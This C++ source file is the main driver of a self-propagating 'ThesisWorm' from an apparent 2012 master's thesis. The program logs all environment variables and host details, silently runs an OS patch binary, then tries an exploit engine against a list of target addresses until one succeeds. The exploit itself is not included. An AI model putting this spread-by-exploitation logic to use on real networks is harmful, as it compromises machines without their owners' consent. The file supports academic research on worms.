//============================================================================
// Name        : ThesisWorm.cpp
// Author      : Rodney Beede
// Version     :
// Copyright   : Copyright 2012
// Description : Master's Thesis project
//
// Requires:	Boost 1.48.0
//			OpenSSL 1.0.0g (32-bit)
//
//============================================================================


#define PROGRAM_NAME "ThesisWorm"

#include <string>
#include <iostream>
#include <sstream>

#include <boost/filesystem/operations.hpp>
#include <boost/lexical_cast.hpp>

#include "Utilities.hpp"
#include "logger.hpp"
#include "Configuration.hpp"
#include "ArgumentParser.hpp"
#include "Exploit.hpp"


// Filled-in by linker for us to allow us to hash the executable code in-memory for getVersion() method
// Helpful guide to how to access the linker symbols was provided by
//	//http://stackoverflow.com/questions/7370407/get-the-start-and-end-address-of-text-section-in-an-executable
extern unsigned char startOfCodeSegment;
extern unsigned char endOfCodeSegment;


Logger * logger;



// Uses a little trick to read the code segment of the process in-memory and hashes the raw byte data to give a more
//	consistent version so that the versioning is automatic and doesn't require someone to remember to increment it.
// This requires some assistance from the linker script
// Also we don't rely on trying to read the program executable on disk because there isn't a portable way to easily do
//	so.  argv[0] on Linux or Windows could be faked or missing.  Windows has an API, but it doesn't specify what
//	happens if the process is running and the executable was deleted.
std::string getVersion() {
	assert(&startOfCodeSegment < &endOfCodeSegment);
	
	const ptrdiff_t length = &endOfCodeSegment - &startOfCodeSegment;

	std::string version = Utilities::hash(&startOfCodeSegment, length);
	
	if("" == version) {
		return "Unable to determine version";
	} else {
		return version;
	}
}


void logUsefulDebug(const int argc, const char * const argv[]) {
	
	logger->log("Begin list of all environment variables and values:");
	std::vector<std::string> envVarNames = Utilities::getListEnvVarNames();
	
	for(int i = 0; i < envVarNames.size(); i++) {
		logger->log(envVarNames[i] + " ==> " + *(Utilities::getEnvVar(envVarNames[i])));
	}
	logger->log("End of all environment variables and values");
	
	
	logger->log("Begin list of argv:");
	for(int i = 0; i < argc; i++) {
		if(NULL != argv[i]) {
			logger->log(argv[i]);
		}
	}
	logger->log("End list of argv:");
}


void logAddresses() {
	std::vector<std::string> addresses = Utilities::getHostAddresses();
	
	for(int i = 0; i < addresses.size(); i++) {
		logger->log(addresses[i]);
	}
}

/**
 * Criteria:
 *	Writable
 *	Sufficient free space (at least 1MiB)
 * 
 * Typically tries known environment variables as possible locations
 * 
 * @return absolute path where the log can be stored (includes log filename)
 */
std::string findSuitableLogLocation() {
	std::vector<std::string> envVarsToTry;
	// Windows type
	envVarsToTry.push_back("APPDATA");
	envVarsToTry.push_back("LOCALAPPDATA");
	envVarsToTry.push_back("USERPROFILE");
	envVarsToTry.push_back("PUBLIC");
	envVarsToTry.push_back("TEMP");
	// Unixie type
	envVarsToTry.push_back("HOME");
	envVarsToTry.push_back("TMP");

	std::string directory;
	
	//TODO There is no portable (platform independent) way to set permissions on a directory/file so that the creator
	//	is the only one with permissions.  A utility library to handle common platforms will have to be developed.
	
	for(int i = 0; i < envVarsToTry.size(); i++) {
		if(Utilities::getEnvVar(envVarsToTry[i])) {
			// We just use '/' as a path separator since APIs don't get picky about it regardless of the platform
			directory = *(Utilities::getEnvVar(envVarsToTry[i])) + "/" + PROGRAM_NAME;
			// Can we write to this path?
			
			if(!boost::filesystem::exists(directory) && boost::filesystem::create_directory(directory)) {
				// Success so use this
				break;
			} else if(boost::filesystem::exists(directory)) {
				// Directory already exists (previous run probably) so try a test file
				std::string testWriteableFile = directory + "/" + Utilities::makeSafeFilename(Utilities::getCurrentTimestamp() + ".tmp");
				std::ofstream testStream;
				testStream.open(testWriteableFile.c_str(), std::ios::out | std::ios::binary);
				testStream << "TESTING FOR WRITE PERMISSION";
				if(testStream.fail()) {
					// Not a good one
					testStream.close();
					
					continue;
				}

				// Write was successful
				testStream.close();
				boost::filesystem::remove(testWriteableFile);
				break;
			}
		}
	}
	
	if(directory.empty()) {
		// Failed to find anything.  All filesystems read-only?
		std::cerr << "Unable to find place to write log" << std::endl;
		exit(255);
	}
	
	//TODO check filesystem free space
	
	std::string filename = Utilities::getCurrentTimestamp() + ".log";
	filename = Utilities::makeSafeFilename(filename);
	
	return directory + "/" + filename;
}


/**
  * envp - Non-standard and not POSIX.1 compliant.  If anything were to modify the env this would have pointed to stale
  *			data so instead use the "extern char **environ" pointer care of unistd.h
 *			For this program we use a helper function in the Utilities class.
 */
int main(const int argc, const char * const argv[]) {
	// Choose a location for the log file
	const std::string logPathname = findSuitableLogLocation();
	logger = new Logger(logPathname);
	
	std::cout << "Logging to " << logPathname << std::endl;

	logger->log("Beginning execution");
	logger->log("Log written to " + logPathname);
	logUsefulDebug(argc, argv);
	logger->log("Version hash:  " + getVersion());
	logger->log("Hostname (according to OS not DNS) is " + Utilities::getHostname());
	logger->log("Host addresses on machine:");
	logAddresses();
	
	
	// Parse arguments
	if(!ArgumentParser::parse(argc, argv)) {
		// Error and already logged so leave
		return 255;
	}
	
	logger->log("Local system time for worm is " + Utilities::getCurrentTimestamp());
	
	
	// Patch this local machine (unless flagged as seed)
	if(!Configuration::isRootSeed) {
		// Update it
		logger->log("Applying OS patch to this machine");
		
		/*
		 * Standard Windows patch update command options
		 * 
		 * -u = unattended
		 * -z = no reboot
		 * -q = 
		 */
		const std::string cmdLine = Configuration::updateBinaryFullPathname + " -u -z -q";
		logger->log("DEBUG:\t" + cmdLine);
		
		const int osUpdateReturnCode = system(cmdLine.c_str());
		
		// Return code for unattended install is expected to be 3010 (ERROR_SUCCESS_REBOOT_REQUIRED) for success
		if(3010 != osUpdateReturnCode) {
			logger->log("ERROR:  Application of update returned error exit code of " + boost::lexical_cast<std::string>(osUpdateReturnCode));
		} else {
			logger->log("OS update patch applied successfully");
			logger->log("Machine may need to be rebooted for patch to take affect");
		}
	} else {
		logger->log("Worm running as seed so not executing OS update patch for this machine");
	}
	
	
	// Try the first target (and only 1 successful target).  Loop until a successful exploit.
	Exploit exploitEngine;
	while(!Configuration::targets.empty()) {
		const std::string targetAddress = Configuration::targets.front();
		Configuration::targets.pop_front();

		logger->log("Attempting target " + targetAddress);
		if(exploitEngine.exploit(targetAddress)) {
			logger->log("Successfully exploited " + targetAddress);
			break;
		} else {
			logger->log("Unsuccessful");
		}
	}
	
	
	delete(logger);
	
	return EXIT_SUCCESS;
}
